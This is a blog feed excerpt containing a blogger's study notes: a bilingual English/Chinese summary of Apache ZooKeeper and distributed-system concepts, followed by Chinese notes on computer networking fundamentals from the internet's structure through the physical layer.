        <content type="html"><![CDATA[<h2 id="Introduction-to-ZooKeeper"><a href="#Introduction-to-ZooKeeper" class="headerlink" title="Introduction to ZooKeeper"></a>Introduction to ZooKeeper</h2><h3 id="Introduction-to-Distributed-System"><a href="#Introduction-to-Distributed-System" class="headerlink" title="Introduction to Distributed System"></a>Introduction to Distributed System</h3><p>Many independent programs running on set of different computers.</p><h3 id="Introduction-to-Coordination-Service"><a href="#Introduction-to-Coordination-Service" class="headerlink" title="Introduction to Coordination Service"></a>Introduction to Coordination Service</h3><p>Co-ordination service is service which</p><ol><li>communicated with all computers in system.</li><li>coordinates with all computers in system.</li><li>manages all computers in system.</li><li>controls with all computers in system.</li></ol><h3 id="What-is-ZooKeeper"><a href="#What-is-ZooKeeper" class="headerlink" title="What is ZooKeeper"></a>What is ZooKeeper</h3><p>Apache ZooKeeper is the coordination service for distribute systems. It is</p><ul><li>Open source</li><li>Reliable &amp; scalable</li><li>High-performance</li><li>Lightweight</li></ul><h2 id="Distributed-System"><a href="#Distributed-System" class="headerlink" title="Distributed System"></a>Distributed System</h2><h3 id="Understanding-distributed-system"><a href="#Understanding-distributed-system" class="headerlink" title="Understanding distributed system"></a>Understanding distributed system</h3><p>A distributed system is defined as a software system that is composed of independent computing entities linked together by a computer network whose components communicate and coordinate with each other to achieve a common goal.<br>分布式系统定义为一种软件系统，它由通过计算机网络链接在一起的独立计算实体组成，计算机网络的组件相互通信和协调以实现共同的目标。</p><h3 id="Characteristics-of-distributed-system"><a href="#Characteristics-of-distributed-system" class="headerlink" title="Characteristics of distributed system"></a>Characteristics of distributed system</h3><ol><li>Resource sharing(资源贡献):<br>This refers to the possibility of using the resources in the system, such as storage space, computing power, data and services from anywhere and so on…</li><li>Extensibility(可扩展):<br>This refers to the possibility of extending &amp; improving the system incrementally, both from hardware and software perspectives.</li><li>Concurrency(并发):<br>This refers to the system’s capability to be used by multiple users at the same time to accomplish the same task or different tasks.</li><li>Performance and scalability(性能和可扩展性):<br>This ensure that the response time of the system doesn’t degrade as the overall load increases.</li><li>Fault tolerance(容错):<br>This ensures that the system is always available even if some of the components fail or operate in a degraded mode.</li><li>Abstraction through APIs:<br>This ensures that system’s individual components are concealed from the end users, revealing only the end services to them.</li></ol><h3 id="Fallacies-while-designing-Network-File-System"><a href="#Fallacies-while-designing-Network-File-System" class="headerlink" title="Fallacies while designing Network File System"></a>Fallacies while designing Network File System</h3><p>Perfect Assumptions</p><ul><li>The network is reliable</li><li>Latency is zero</li><li>Bandwidth is infinite</li><li>The network is secure</li><li>Topology doesn’t change(拓扑不变)</li><li>There is one administrator</li><li>Transport cost is zero</li><li>The network is homogeneous</li></ul><h3 id="Challenges-while-implementing-coordination-in-distributed-system"><a href="#Challenges-while-implementing-coordination-in-distributed-system" class="headerlink" title="Challenges while implementing coordination in distributed system"></a>Challenges while implementing coordination in distributed system</h3><ul><li>Everything depends on master node. Dependence (The master is offline, then all clients belong it is unavailable.)</li><li>Service Discovery</li></ul><ol><li>To increase availability of application &amp; bear the load, we add more servers.<br>为了增加应用程序的可用性并承担负载，我们添加了更多服务器。</li><li>We can tell client machines about availability of new servers.<br>我们可以告诉客户端计算机新服务器的可用性。</li><li>To do this, we need to implement that logic in client carefully.<br>为此，我们需要在客户端中仔细实现该逻辑。</li></ol><ul><li>Scalability</li></ul><ol><li>Scalability means to make system grow bigger in size.<br>可伸缩性意味着使系统更大。</li><li>By adding new machines, chances of crashing the system also increases.<br>通过添加新机器，崩溃系统的机会也增加了。</li><li>Common reasons of failure are hardware faults, system crashes, communication link failures<br>失败的常见原因是硬件故障，系统崩溃，通信链接故障。</li></ol><h2 id="Introduction-to-Apache-ZooKeeper"><a href="#Introduction-to-Apache-ZooKeeper" class="headerlink" title="Introduction to Apache ZooKeeper"></a>Introduction to Apache ZooKeeper</h2><ul><li>Apache Zookeeper is a software developed by Apache.</li><li>It acts as centralized service &amp; maintains naming &amp; configuration data.<br>它充当集中服务并维护命名和配置数据。</li><li>It also provides flexible and robust synchronization within distributed systems.<br>它还在分布式系统内提供灵活而强大的同步</li></ul><h3 id="Architectural-Services-of-ZooKeeper"><a href="#Architectural-Services-of-ZooKeeper" class="headerlink" title="Architectural Services of ZooKeeper"></a>Architectural Services of ZooKeeper</h3><ol><li>Distributed Consensus:<br>Its an agreement on a single data value among a group of process connected by an unreliable network.<br>分布式共识处理通过不可靠网络连接的一组进程之间的单个数据值达成协议。</li><li><p>Group Management:<br>Managing groups of nodes in a distributed environment always requires a critical implementation of high-performance coordination services.<br>在分布式环境中管理节点组始终需要高性能协调服务的关键实现。</p></li><li><p>Presence Protocol:<br>This defines presence-related extensions session initiation. This set of protocols describe how other protocols are used by terminals to establish, modify, and terminate sessions.<br>这定义了与状态相关的扩展会话启动。这套协议描述了终端如何使用其他协议来建立，修改和终止会话。</p></li><li><p>Leader Election:<br>Leader election is the process of designating a single process as the organizer of some task distributed among several nodes<br>领导者选举是将单个过程指定为分布在多个节点之间的某些任务的组织者的过程</p></li></ol><h3 id="ZooKeeper-coordination-tasks"><a href="#ZooKeeper-coordination-tasks" class="headerlink" title="ZooKeeper coordination tasks"></a>ZooKeeper coordination tasks</h3><p>With ZooKeeper, developers can implement common distributed coordination tasks, such as the following:</p><ol><li>Configuration management</li><li>Naming service</li><li>Distributed synchronization, such as locks and barriers</li><li>Cluster membership operations, such as detection of node leave/node join</li></ol><h3 id="ZooKeeper-Ensemble"><a href="#ZooKeeper-Ensemble" class="headerlink" title="ZooKeeper Ensemble"></a>ZooKeeper Ensemble</h3><p>In a production environment, ZooKeeper should be run on multiple servers in a replicated mode, also called a ZooKeeper ensemble.<br>在生产环境中，ZooKeeper应该以复制模式在多个服务器上运行，也称为ZooKeeper集成。</p><p>The minimum recommended number of servers is three, and five is the most common in a production environment.<br>建议的最小服务器数量为三台，而在生产环境中，最常见的服务器数量为五台。</p><h2 id="Chapter-2"><a href="#Chapter-2" class="headerlink" title="Chapter 2"></a>Chapter 2</h2><h3 id="Understanding-ZooKeeper-Services"><a href="#Understanding-ZooKeeper-Services" class="headerlink" title="Understanding ZooKeeper Services"></a>Understanding ZooKeeper Services</h3><ul><li><p>ZooKeeper is coordination service for distributed applications.<br>ZooKeeper是用于分布式应用程序的协调服务。</p></li><li><p>So its objective is to solve the difficult issues associated with the coordination of components in a distributed application.<br>因此，其目标是解决与分布式应用程序中的组件协调相关的难题。</p></li><li><p>This is done by exposing simple powerful interface of primitives.<br>这是通过公开简单而强大的基元接口来完成的。</p></li><li><p>Applications can be designed on these primitives implemented through ZooKeeper APIs.<br>可以在通过ZooKeeper API实现的这些原语上设计应用程序。</p></li><li><p>It can solve problems of </p><ul><li>distributed synchronization</li><li>cluster configuration management</li><li>group membership and so on.<br>它可以解决 分布式同步 集群配置管理 小组成员等等。</li></ul></li><li><p>ZooKeeper is a replicated and distributed application with the intention to run as a service.<br>ZooKeeper是一个复制和分布式应用程序，旨在作为服务运行。</p></li><li><p>This replicated set of servers on which the ZooKeeper service is running, called ZooKeeper ensemble.<br>运行ZooZeeper服务的此复制服务器集，称为ZooKeeper集成</p></li><li><p>Clients can connect to a ZooKeeper service by connecting to any member of the ensemble.<br>客户端可以通过连接到集成的任何成员来连接到ZooKeeper服务。</p></li><li><p>The members of the ensemble are aware of each other’s state.<br>合奏的成员知道彼此的状态。</p></li><li><p>They save information in durable manner in the local data store.<br>它们以持久的方式将信息保存在本地数据存储中</p></li><li><p>ZooKeeper is a highly available service<br>ZooKeeper是一项高可用性服务</p></li><li><p>As long as a majority of the servers are available, the service will always be available.<br>只要大多数服务器可用，该服务将始终可用。</p></li></ul><h3 id="ZooKeeper-Data-Model"><a href="#ZooKeeper-Data-Model" class="headerlink" title="ZooKeeper Data Model"></a>ZooKeeper Data Model</h3><ul><li><p>ZooKeeper allows distributed processes to coordinate with each other through a shared hierarchical namespace of data registers.<br>ZooKeeper允许分布式进程通过共享的数据寄存器分层名称空间相互协调。</p></li><li><p>The namespace looks quite similar to a Unix file system.<br>命名空间看起来与Unix文件系统非常相似。</p></li><li><p>The data registers are known as znodes in the ZooKeeper.<br>数据寄存器在ZooKeeper中被称为znodes。</p></li><li><p>znodes are organized hierarchically as a standard file system.<br>znodes被分层组织为标准文件系统。</p></li><li><p>The root node has one child znode called <code>/zoo</code>.<br>根节点具有一个称为<code>/zoo</code>的子znode。</p></li><li><p>Every znode in the ZooKeeper tree is identified by a path.<br>ZooKeeper树中的每个znode均由路径标识。</p></li><li><p>The path elements are separated by <code>/</code>.<br>路径元素由<code>/</code>分隔。</p></li><li><p>znodes are called data registers as they can store data.<br>znode被称为数据寄存器，因为它们可以存储数据。</p></li><li><p>The znode can have children as well as data associated with it.<br>znode可以具有子节点以及与其关联的数据。</p></li><li><p>Every znode maintains a stat structure.<br>每个znode都维护一个统计结构。</p></li><li><p>A stat simply provides the metadata of a znode.<br>统计信息仅提供znode的元数据。<br>It consists of</p><ul><li>Version number</li><li>Action Control List (ACL)</li><li>Data length</li><li>Timestamp</li></ul></li><li><p>Version number:<br>Every znode has a version number and it means every time the data associated with the znode changes, its version number would also increase.<br>每个znode都有一个版本号，这意味着与znode关联的数据每次更改时，其版本号也会增加。<br>The use of version number is important when multiple zookeeper clients are trying to perform operations over the same znode.<br>当多个Zookeeper客户端试图在同一znode上执行操作时，使用版本号很重要。</p></li><li><p>Action Control List (ACL):<br>It is authentication mechanism for accessing the znode.<br>它是用于访问znode的身份验证机制。<br>It governs all the znode read and write operations.<br>它控制着所有znode的读写操作。</p></li><li><p>Data length:<br>It is total amount of the data stored in a znode.<br>它是存储在znode中的数据总量。<br>You can store a maximum of 1MB of data.<br>您最多可以存储1MB的数据。</p></li><li><p>Timestamp:<br>It is time elapsed from znode creation &amp; modification. It is usually represented in milliseconds.<br>从znode创建和修改开始到现在为止。通常用毫秒表示。<br>ZooKeeper identifies every change to the znodes from “Transaction ID” (zxid).<br>ZooKeeper通过“交易ID”（zxid）识别对znode的所有更改。<br>Zxid is unique &amp; maintains time for each transaction so that you can easily identify the time elapsed from one request to another request.<br>Zxid是唯一的，并且为每个事务维护时间，因此您可以轻松地确定从一个请求到另一个请求所经过的时间。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hadoop </tag>
            
            <tag> note </tag>
            
            <tag> zookeeper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络笔记bp</title>
      <link href="/blog/note-computer-network-bp/"/>
      <url>/blog/note-computer-network-bp/</url>
      
        <content type="html"><![CDATA[<p>马上要上网课了-，-<br>这**专业计算机网络还是选修课，我真nmb的服了，还好我能选<br>——20200302</p><hr><h1 id="1-计算机网络"><a href="#1-计算机网络" class="headerlink" title="1 计算机网络"></a>1 计算机网络</h1><h2 id="1-1-计算机网络在信息时代中的作用"><a href="#1-1-计算机网络在信息时代中的作用" class="headerlink" title="1.1 计算机网络在信息时代中的作用"></a>1.1 计算机网络在信息时代中的作用</h2><p>21世纪的重要特征就是数字化、网络化和信息化，它是一个以网络为核心的信息时代。<br>有三大类大家很熟悉的网络，即电信网络、有线电视网络和计算机网络。<br>随着技术的发展，网络技术相互融合</p><p>互联网具有两个重要基本特点，即连通性和共享</p><h2 id="1-2-互联网概述"><a href="#1-2-互联网概述" class="headerlink" title="1.2 互联网概述"></a>1.2 互联网概述</h2><p>起源于美国的互联网现已发展成为世界上最大的覆盖全球的计算机网络<br>计算机网络由若干结点和连接这些结点的链路组成。网络中的结点可以是计算机、集线器、交换机或路由器等</p><p>网络之间还可以通过路由器互连起来，这就构成了一个覆盖范围更大的计算机网络。这样的网络称为互连网，互连网是网络的网络。</p><p>网络把许多计算机连接在一起，而互连网则把许多网络通过路由器连接在一起。与网络相连的计算机常称为主机。</p><h3 id="1-2-2-互联网发展的三个阶段"><a href="#1-2-2-互联网发展的三个阶段" class="headerlink" title="1.2.2 互联网发展的三个阶段"></a>1.2.2 互联网发展的三个阶段</h3><p>第一阶段是从单个网络ARPANET向互连网发展的过程。<br>第二阶段的特点是建成了三级网络结构，分为主干网、地区网和校园网(或企业网)<br>第三阶段的特点是逐渐形成了多层次ISP结构的互联网<br>互联网服务提供者ISP(Internet Service Provider)<br>根据提供服务的覆盖面积大小以及所拥有的IP地址数目的不同，ISP也分为不同层次的ISP：主干ISP、地区ISP和本地ISP<br>互联网交换点IXP(Internet eXchange Point)<br>互联网交换点IXP的主要作用就是允许两个网络直接相连并交换分组，而不需要再通过第三个网络来转发分组。</p><p>万维网WWW(World Wide Web)是一种互联网技术包括超文本等</p><h3 id="1-2-3-互联网的的标准化工作"><a href="#1-2-3-互联网的的标准化工作" class="headerlink" title="1.2.3 互联网的的标准化工作"></a>1.2.3 互联网的的标准化工作</h3><p>RFC(Request for comments)</p><ol><li>互联网草案</li><li>建议标准 开始成为RFC文档</li><li>互联网标准 分配编号<code>STD xx</code>，可以和多个RFC文档关联</li></ol><p>RFC文档：建议标准、互联网标准、历史的、实验的和提供信息的RFC文档</p><h2 id="1-3-互联网的组成"><a href="#1-3-互联网的组成" class="headerlink" title="1.3 互联网的组成"></a>1.3 互联网的组成</h2><p>从其工作方式上看：<br>(1)边缘部分 由所有连接在互联网上的主机组成，这部分是用户直接使用的，用来进行通信（传送数据、音频或视频）和资源共享<br>(2)核心部分 由大量网络和连接这些网络的路由器组成，这部分是为边缘部分提供服务的（提供连通性和交换）</p><h3 id="1-3-1-互联网的边缘部分"><a href="#1-3-1-互联网的边缘部分" class="headerlink" title="1.3.1 互联网的边缘部分"></a>1.3.1 互联网的边缘部分</h3><p>处于互联网边缘的部分就是连接在互联网上的所有主机，这些主机又称为端系统<br>主机A和主机B进行通信实际上是主机A的某个进程和主机B上的另一个进程进行通信，简称为计算机之间的通信<br>在网络边缘的端系统之间的通信方式通常可划分为两大类：客户-服务器方式(C/S)方式和对等方式(P2P Peer-to-peer)</p><ol><li><p>客户-服务器方式<br>客户是服务请求放，服务器是服务提供方<br>客户程序：必须知道服务器程序的地址；不需要特殊的硬件和很复杂的操作系统<br>服务器程序：是一种专门用来提供某种服务的程序，可同时处理多个远地或本地客户请求；系统启动后自动调用并一直不断地运行着，被动地等待并接受来自各地的客户通信请求，不需要知道客户程序地址；一般需要有强大的硬件和高级的操作系统支持。</p></li><li><p>对等连接<br>对等连接是指两台主机在通信时并不区分哪一个是服务请求方哪一个是服务提供方</p></li></ol><h3 id="1-3-2-互联网的核心部分"><a href="#1-3-2-互联网的核心部分" class="headerlink" title="1.3.2 互联网的核心部分"></a>1.3.2 互联网的核心部分</h3><p>网络核心部分是互联网中最负责的部分<br>在网络核心部分起特殊作用的是路由器，它是一种专用计算机，是实现分组交换的关键构件，其任务是转发收到的分组，这是网络核心部分最重要的功能。</p><p>从通信资源的分配角度来看，交换是按照某种方式动态地分配传输线路的资源。<br>必须经过“建立连接-&gt;通话-&gt;释放连接”三个步骤的交换方式称为电路交换。</p><p>电路交换的一个重要特点就是在通话的全部时间内，通话的两个用户始终占用端到端的通信资源。<br>使用电路交换来传送计算机数据时，其线路的传输效率往往很低。</p><p>分组交换的主要特点<br>分组交换采用存储转发技术，将一个报文划分为几个分组后再进行传送，通常我们把要发送的整块数据称为一个报文。在每个数据段前面加上一一些由必要的控制信息组成的首部后，就构成了一个分组，分组又称为“包”，而分组的首部也可称为“包头”。</p><p>位于网络边缘的主机和位于网络核心部分的路由器都是计算机，但它们的作用却很不一样。主机是为用户进行信息处理的，并且可以和其他主机通过网络交换信息。路由器则是用来转发分组的，即进行分组交换的。路由器收到一个分组，先暂时存储一下，检查其首部，查找转发表，按首部中的目的地址，找到合适的借口转发出去，把分组交给下一个路由器。</p><p>我们往往把单个的网络简化成一条链路，而路由器称为核心部分的结点。</p><p>路由器暂时存储的是一个个短分组，而不是整个的长报文。短分组是暂存在路由器的存储器（即内存）中而不是存储在磁盘中的，这保证了较高的交换速率。<br>分组交换在传送数据之前不必先占用一条端到端的链路的通信资源。分组在那段连路上传送才占用这条链路的通信资源。省去了建立连接和释放连接的开销。</p><p>分组交换的优点：高效、灵活、迅速、可靠<br>高效：在分组传输过程中动态分配传输带块，对通信链路是逐段占用<br>灵活：为每一个分组独立地选择最合适的转发路由<br>迅速：以分组作为传送单位，可以不先建立连接就能向其他主机发送分组<br>可靠：保证可靠性的网络协议；分布式多路由的分组交换网，使网络有很好的生存性</p><p>电报通信采用基础存储转发原理的报文交换。<br>电路交换——整个报文的比特流连续地从源点直达终点，好像在一个管道中传送。<br>报文交换——整个报文先传送到相邻结点，全部存储下来后查找转发表，转发到下一个结点<br>分组交换——单个分组传送到相邻结点，存储下来后查找转发表，转发到下一个结点。<br><img src="/img/note-computer-network/20200316152522.png" alt></p><h2 id="1-4-计算机网络在我国的发展"><a href="#1-4-计算机网络在我国的发展" class="headerlink" title="1.4 计算机网络在我国的发展"></a>1.4 计算机网络在我国的发展</h2><p>最早着手建设专用计算机广域网的是铁道部，1989年11月我国第一个公用分组交换网CNPAC建成运行；1994年4月20日，我国用64kbit/s专线正式连入互联网，从此我国被国际上正式承认为接入互联网的国家。</p><h2 id="1-5-计算机网络的类别"><a href="#1-5-计算机网络的类别" class="headerlink" title="1.5 计算机网络的类别"></a>1.5 计算机网络的类别</h2><h3 id="1-5-1-计算机网络的定义"><a href="#1-5-1-计算机网络的定义" class="headerlink" title="1.5.1 计算机网络的定义"></a>1.5.1 计算机网络的定义</h3><p>计算机网络的精确定义并未统一<br>计算机网络主要是由一些通用的、可编程的硬件互连而成的，而这些硬件并非专门用来实现某一特点目的。这些可编程的硬件能够用来传送多种不同类型的数据，并能支持广泛的和日益增长的应用。</p><h3 id="计算机的类别"><a href="#计算机的类别" class="headerlink" title="计算机的类别"></a>计算机的类别</h3><ol><li>按照网络的作用范围：广域网WAN、城域网MAX，局域网LAN，个人区域网PAN</li><li>按照网络的使用者进行分类：公用网、专用网</li><li>用来把用户接入互联网的网络：接入网（本地接入网或居民接入网），接入网不属于互联网的核心部分也不属于互联网的边缘部分</li></ol><h2 id="1-6-计算机网络的性能"><a href="#1-6-计算机网络的性能" class="headerlink" title="1.6 计算机网络的性能"></a>1.6 计算机网络的性能</h2><h3 id="1-6-1-性能指标"><a href="#1-6-1-性能指标" class="headerlink" title="1.6.1 性能指标"></a>1.6.1 性能指标</h3><ol><li>速率：数据传送的速率，也称为数据率或比特率(bit/s)，提到网络的速率时，往往指的是额定速率或标称速率</li><li>带宽：带宽本来是指某个信号具有的频带宽度，这种意义的带宽单位是赫。计算机网络中带宽用来表示网络中牟通道传送数据的能力，因此网络带宽表示单位事件内网络中的某信道所能通过的“最高数据率”，这种意义的带宽单位是数据率的单位(bit/s)</li><li>吞吐量：表示在单位事件内通过某个网络的实际的数据量。吞吐量受网络的带宽或网络的额定速率的先知</li><li><p>时延：是指数据从网络的一段传送到另一端所需的事件。有事也称延迟或迟延。<br>(1) 发送时延： 发送时延是驻地或路由器发送数据帧所需要的时间，也就是从发送数据帧的第一个比特起到最后一个比特发送完毕所需时间，因此也称为传输时延。<br>(2) 传播时延：是电磁波在信道中传播一定的距离需要花费的时间，=信道长度/电磁波在信道上的传播速率，与传输信道的长度没有任何关系，与信号的发送速率无关。信号传送距离越远，传播时延就越大。<br>(3) 处理时延：分析分组的首部、从分组中提取数据部分、进行差错检验或查找适当的路由<br>(4) 排队时延：分组在经过网络传输时，要经过许多路由器。但分组在进入路由器后要先在输入队列中排队等待处理。<br>总时延=发送时延+传播时延+处理时延+排队时延</p></li><li><p>时延带宽积：传播时延x带宽</p></li><li>往返时间RTT：表示从发送方发送数据开始，到发送方收到来自接收方的确认，总共经理的时间。有效数据率=数据长度/(发送事件+RTT)</li><li>利用率：<br>分为信道利用率和网络利用率。</li></ol><ul><li>信道利用率指出某信道有百分之几的时间是被利用的（有数据通过）。完全空闲的信道的利用率是零。</li><li>网络利用率则是全网络的信道利用率的加权平均值。<br>信道利用率并非越高越好当某信道的利用率增大时，该信道引起的时延也就迅速增加。</li></ul><p>时延与网络利用率的关系<br>若令$D_0$表示网络空闲时的时延，$D$表示网络当前的时延，则在适当的假定条件下，可以用下面的简单公式表示$D$和$D_0$之间的关系，其中$U$是网络的利用率，$U\in (0,1)$</p><script type="math/tex; mode=display">D=\frac{D}{1-U}</script><h3 id="1-6-2-计算机网络的非性能特征"><a href="#1-6-2-计算机网络的非性能特征" class="headerlink" title="1.6.2 计算机网络的非性能特征"></a>1.6.2 计算机网络的非性能特征</h3><ul><li>费用</li><li>质量</li><li>标准化</li><li>可靠性</li><li>可扩展性和可升级性</li><li>易于管理和维护</li></ul><h2 id="1-7-计算机网络的体系结构"><a href="#1-7-计算机网络的体系结构" class="headerlink" title="1.7 计算机网络的体系结构"></a>1.7 计算机网络的体系结构</h2><ul><li>计算机网络是个非常复杂的系统</li><li>相互通信的两个计算机系统必须高度协调工作才行，而这种“协调”是相当复杂的。</li><li>“分层”可将庞大而复杂的问题转化为若干较小的局部问题，而这些较小的局部问题就比较易于研究和处理。</li></ul><h3 id="1-7-1-计算机网络体系结构的形成"><a href="#1-7-1-计算机网络体系结构的形成" class="headerlink" title="1.7.1 计算机网络体系结构的形成"></a>1.7.1 计算机网络体系结构的形成</h3><ul><li>1974年，美国的IBM公司宣布了系统网络体系结构SNA (System Network Architecture)。这个著名的网络标准就是按照分层的方法制定的。</li><li>由于网络体系结构的不同，不同公司的设备很难互相连通。</li><li>国际标准化组织ISO于1977年成立了专门机构研究该问题。</li><li>他们提出了一个试图使各种计算机在世界范围内互连成网的标准框架，即著名的开放系统互连基本参考模型 OSI/RM(Open Systems Interconnection Reference Model)，简称为 OSI。<br>只要遵循 OSI 标准，一个系统就可以和位于世界上任何地方的、也遵循这同一标准的其他任何系统进行通信。</li></ul><p>法律上的 (de jure) 国际标准OSI 并没有得到市场的认可。<br>非国际标准 TCP/IP 却获得了最广泛的应用。TCP/IP 常被称为事实上的 (de facto) 国际标准。</p><h3 id="1-7-2-协议与划分层次"><a href="#1-7-2-协议与划分层次" class="headerlink" title="1.7.2 协议与划分层次"></a>1.7.2 协议与划分层次</h3><ul><li>计算机网络中的数据交换必须遵守事先约定好的规则。</li><li>这些规则明确规定了所交换的数据的格式以及有关的同步问题（同步含有时序的意思）。</li><li>网络协议 (network protocol)，简称为协议，是为进行网络中的数据交换而建立的规则、标准或约定。</li></ul><p>网络协议的三个组成要素</p><ul><li>语法：数据与控制信息的结构或格式。</li><li>语义：需要发出何种控制信息，完成何种动作以及做出何种响应。</li><li>同步：事件实现顺序的详细说明。<br>网络协议是计算机网络的不可缺少的组成部分</li></ul><p>协议的两种形式：文字描述、程序代码<br>这两种不同形式的协议都必须能够对网络上信息交换过程做出精确的解释。<br>ARPANET 的研制经验表明，对于非常复杂的计算机网络协议，其结构应该是层次式的。</p><p>分层的好处与缺点<br>好处</p><ul><li>各层之间是独立的。 </li><li>灵活性好。 </li><li>结构上可分割开。 </li><li>易于实现和维护。 </li><li>能促进标准化工作。<br>缺点</li><li>降低效率。 </li><li>有些功能会在不同的层次中重复出现，因而产生了额外开销</li></ul><p>各层完成的主要功能</p><ol><li>差错控制</li><li>流量控制</li><li>分段和重装</li><li>复用和分用</li><li>连接建立和释放</li></ol><p>计算机网络的体系结构</p><ul><li>计算机网络的体系结构(architecture) 是计算机网络的各层及其协议的集合</li><li>体系结构就是这个计算机网络及其部件所应完成的功能的精确定义。</li><li>实现 (implementation)是遵循这种体系结构的前提下用何种硬件或软件完成这些功能的问题。</li><li>体系结构是抽象的，而实现则是具体的，是真正在运行的计算机硬件和软件。</li></ul><h3 id="1-7-3-具有五层协议的体系结构"><a href="#1-7-3-具有五层协议的体系结构" class="headerlink" title="1.7.3 具有五层协议的体系结构"></a>1.7.3 具有五层协议的体系结构</h3><ul><li>OSI 的七层协议体系结构的概念清楚，理论也较完整，但它既复杂又不实用。</li><li>TCP/IP 是四层体系结构：应用层、运输层、网际层和网络接口层。</li><li>但最下面的网络接口层并没有具体内容。</li><li>因此往往采取折中的办法，即综合 OSI 和TCP/IP的优点，采用一种只有五层协议的体系结构。</li></ul><p>OSI：应用层、表示层、会话层、运输层、网络层、数据链路层、物理层<br>TCP/TP：应用层、运输层、网际层IP、网络接口层<br>5层协议：应用层、运输层、网络层、数据链路层、物理层</p><p>数据加上应用层首部称为报文<br>加上运输层首部，成为运输层报文<br>加上网络层首部，成为 IP数据报（或分组）<br>加上链路层首部和尾部，成为数据链路层帧<br>最下面的物理层把比特流传送到物理媒体<br>收到后去首部向上传递</p><ul><li>OSI 参考模型把对等层次之间传送的数据单位称为该层的协议数据单元PDU (Protocol Data Unit)。这个名词现已被许多非 OSI 标准采用。</li><li>任何两个同样的层次把数据（即数据单元加上控制信息）通过水平虚线直接传递给对方。这就是所谓的“对等层”(peer layers)之间的通信。</li><li>各层协议实际上就是在各个对等层之间传递数据时的各项规定。</li></ul><h3 id="1-7-4-实体、协议、服务和服务访问点"><a href="#1-7-4-实体、协议、服务和服务访问点" class="headerlink" title="1.7.4 实体、协议、服务和服务访问点"></a>1.7.4 实体、协议、服务和服务访问点</h3><ul><li>实体 (entity) 表示任何可发送或接收信息的硬件或软件进程。</li><li>协议是控制两个对等实体进行通信的规则的集合。</li><li>在协议的控制下，两个对等实体间的通信使得本层能够向上一层提供服务。</li><li><p>要实现本层协议，还需要使用下层所提供的服务。<br>上层使用服务原语获得下层所提供的服务。</p></li><li><p>同一系统相邻两层的实体进行交互的地方，称为服务访问点 SAP (Service Access Point)。</p></li><li>服务访问点SAP是一个抽象的概念，它实际上就是一个逻辑接口。</li><li>OSI把层与层之间交换的数据的单位称为服务数据单元 SDU (Service Data Unit).</li></ul><h3 id="1-7-5-TCP-IP-的体系结构"><a href="#1-7-5-TCP-IP-的体系结构" class="headerlink" title="1.7.5 TCP/IP 的体系结构"></a>1.7.5 TCP/IP 的体系结构</h3><p><img src="/img/note-computer-network/20200322000428.png" alt><br>某些应用程序可以直接使用 IP 层，或甚至直接使用最下面的网络接口层.<br><img src="/img/note-computer-network/20200322000353.png" alt></p><h1 id="2-物理层"><a href="#2-物理层" class="headerlink" title="2 物理层"></a>2 物理层</h1><h2 id="2-1-物理层的基本概念"><a href="#2-1-物理层的基本概念" class="headerlink" title="2.1 物理层的基本概念"></a>2.1 物理层的基本概念</h2><ul><li>物理层考虑的是怎样才能在连接各种计算机的传输媒体上传输数据比特流，而不是指具体的传输媒体。</li><li>物理层的作用是要尽可能地屏蔽掉不同传输媒体和通信手段的差异。</li><li>用于物理层的协议也常称为物理层规程(procedure)。</li></ul><p>物理层的主要任务<br>主要任务：确定与传输媒体的接口的一些特性。</p><ul><li>机械特性：指明接口所用接线器的形状和尺寸、引线数目和排列、固定和锁定装置等。</li><li>电气特性：指明在接口电缆的各条线上出现的电压的范围。</li><li>功能特性：指明某条线上出现的某一电平的电压表示何种意义。</li><li>过程特性：指明对于不同功能的各种可能事件的出现顺序。</li></ul><h2 id="2-2-数据通信的基础知识"><a href="#2-2-数据通信的基础知识" class="headerlink" title="2.2 数据通信的基础知识"></a>2.2 数据通信的基础知识</h2><h3 id="2-2-1-数据通信系统的模型"><a href="#2-2-1-数据通信系统的模型" class="headerlink" title="2.2.1 数据通信系统的模型"></a>2.2.1 数据通信系统的模型</h3><p>一个数据通信系统包括三大部分:源系统（或发送端、发送方）、传输系统（或传输网络）和目的系统（或接收端、接收方）。</p><p>常用术语</p><ul><li>数据 (data) —— 运送消息的实体</li><li>信号 (signal) —— 数据的电气的或电磁的表现</li><li>模拟信号 (analogous signal) —— 代表消息的参数的取值是连续的。</li><li>数字信号 (digital signal) —— 代表消息的参数的取值是离散的。</li><li>码元 (code) —— 在使用时间域（或简称为时域）的波形表示数字信号时，代表不同离散数值的基本波形</li><li>信道 —— 一般用来表示向某一个方向传送信息的媒体。</li><li>单向通信（单工通信）—— 只能有一个方向的通信而没有反方向的交互</li><li>双向交替通信（半双工通信）—— 通信的双方都可以发送信息，但不能双方同时发送(当然也就不能同时接收)。</li><li>双向同时通信（全双工通信）—— 通信的双方可以同时发送和接收信息</li></ul><h3 id="2-2-2-有关信道的几个基本概念"><a href="#2-2-2-有关信道的几个基本概念" class="headerlink" title="2.2.2 有关信道的几个基本概念"></a>2.2.2 有关信道的几个基本概念</h3><ul><li>基带信号（即基本频带信号）—— 来自信源的信号。</li><li>基带信号往往包含有较多的低频成分，甚至有直流成分，而许多信道并不能传输这种低频分量或直流分量。因此必须对基带信号进行调制(modulation)。<br>调制分为两大类：<ul><li>基带调制：仅对基带信号的波形进行变换，使它能够与信道特性相适应。变换后的信号仍然是基带信号。把这种过程称为编码 (coding)。</li><li>带通调制：使用载波 (carrier)进行调制，把基带信号的频率范围搬移到较高的频段，并转换为模拟信号，这样就能够更好地在模拟信道中传输（即仅在一段频率范围内能够通过信道）。</li></ul></li><li>带通信号 ：经过载波调制后的信号。</li></ul><p>(1) 常用编码方式</p><ul><li>不归零制</li><li>归零制</li><li>曼彻斯特编码</li><li>差分曼查斯特编码<br>不归零制不能从信号波形本身中提取信号时钟频率（这叫作没有自同步能力），而曼彻斯特编码和差分曼彻斯特编码具有自同步能力。</li></ul><p>(2) 基本的带通调制方法<br>基带信号往往包含有较多的低频成分，甚至有直流成分，而许多信道并不能传输这种低频分量或直流分量。为了解决这一问题，就必须对基带信号进行调制 (modulation)<br>最基本的二元制调制方法有以下几种</p><ul><li>调幅(AM)：载波的振幅随基带数字信号而变化</li><li>调频(FM)：载波的频率随基带数字信号而变化</li><li>调相(PM) ：载波的初始相位随基带数字信号而变化</li></ul><p>正交振幅调制 QAM (Quadrature Amplitude 